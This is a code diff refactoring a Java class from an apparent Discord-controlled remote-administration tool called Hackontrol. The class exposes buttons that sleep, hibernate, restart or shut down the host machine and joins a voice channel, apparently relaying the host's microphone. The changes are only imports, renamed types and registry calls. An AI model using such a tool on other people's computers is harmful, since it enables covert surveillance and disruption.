@@ -5,38 +5,39 @@ import java.util.List;
 import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
-import com.khopan.hackontrol.manager.button.ButtonContext;
-import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.manager.button.Question;
-import com.khopan.hackontrol.manager.button.Question.OptionType;
-import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.InteractionManager;
+import com.khopan.hackontrol.manager.interaction.Question;
+import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.sendable.ISendable;
+import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.managers.AudioManager;
 
 public class ControlChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "control";
 
-	private static final Button BUTTON_SLEEP = ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", "sleep");
-	private static final Button BUTTON_HIBERNATE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", "hibernate");
-	private static final Button BUTTON_RESTART = ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", "restart");
-	private static final Button BUTTON_SHUTDOWN = ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", "shutdown");
+	private static final Button BUTTON_SLEEP      = ButtonManager.staticButton(ButtonType.SECONDARY, "Sleep",      "sleep");
+	private static final Button BUTTON_HIBERNATE  = ButtonManager.staticButton(ButtonType.SUCCESS,   "Hibernate",  "hibernate");
+	private static final Button BUTTON_RESTART    = ButtonManager.staticButton(ButtonType.PRIMARY,   "Restart",    "restart");
+	private static final Button BUTTON_SHUTDOWN   = ButtonManager.staticButton(ButtonType.DANGER,    "Shutdown",   "shutdown");
 
-	private static final Button BUTTON_CONNECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", "connect");
-	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", "disconnect");
+	private static final Button BUTTON_CONNECT    = ButtonManager.staticButton(ButtonType.SUCCESS,   "Connect",    "connect");
+	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonType.DANGER,    "Disconnect", "disconnect");
 
 	private AudioManager audioManager;
 	private MicrophoneSendHandler sendHandler;
 
 	public ControlChannel() {
-		Hackontrol.getInstance().setErrorHandler((thread, Errors) -> HackontrolError.throwable(ChannelSendable.of(this.channel), Errors));
+		Hackontrol.getInstance().setErrorHandler((thread, Errors) -> HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors));
 	}
 
 	@Override
@@ -46,12 +47,12 @@ public class ControlChannel extends HackontrolChannel {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP, context -> this.buttonPower(context, PowerAction.SLEEP));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE, context -> this.buttonPower(context, PowerAction.HIBERNATE));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART, context -> this.buttonPower(context, PowerAction.RESTART));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.buttonPower(context, PowerAction.SHUTDOWN));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.buttonConnect(context, true));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP,      context -> this.buttonPower(context, PowerAction.SLEEP));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE,  context -> this.buttonPower(context, PowerAction.HIBERNATE));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART,    context -> this.buttonPower(context, PowerAction.RESTART));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN,   context -> this.buttonPower(context, PowerAction.SHUTDOWN));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT,    context -> this.buttonConnect(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
 	}
 
 	@Override
@@ -61,7 +62,7 @@ public class ControlChannel extends HackontrolChannel {
 	}
 
 	private void buttonPower(ButtonContext context, PowerAction powerAction) {
-		Question.positive(context.reply(), "Are you sure you want to " + powerAction.name().toLowerCase() + '?', OptionType.YES_NO, () -> {
+		Question.positive(context.reply(), "Are you sure you want to " + powerAction.name().toLowerCase() + '?', QuestionType.YES_NO, () -> {
 			String message = switch(powerAction) {
 			case SLEEP -> NativeLibrary.sleep();
 			case HIBERNATE -> NativeLibrary.hibernate();
@@ -86,7 +87,7 @@ public class ControlChannel extends HackontrolChannel {
 		if(connect) {
 			try {
 				if(this.voiceConnect(guild, context.reply(), true)) {
-					context.acknowledge();
+					context.deferEdit().queue();
 				}
 			} catch(Throwable Errors) {
 				HackontrolError.throwable(context.message(), Errors);
@@ -95,7 +96,7 @@ public class ControlChannel extends HackontrolChannel {
 			return;
 		}
 
-		Question.positive(context.reply(), "Are you sure you want to disconnect?", OptionType.YES_NO, () -> {
+		Question.positive(context.reply(), "Are you sure you want to disconnect?", QuestionType.YES_NO, () -> {
 			try {
 				this.voiceConnect(guild, context.message(), false);
 			} catch(Throwable Errors) {
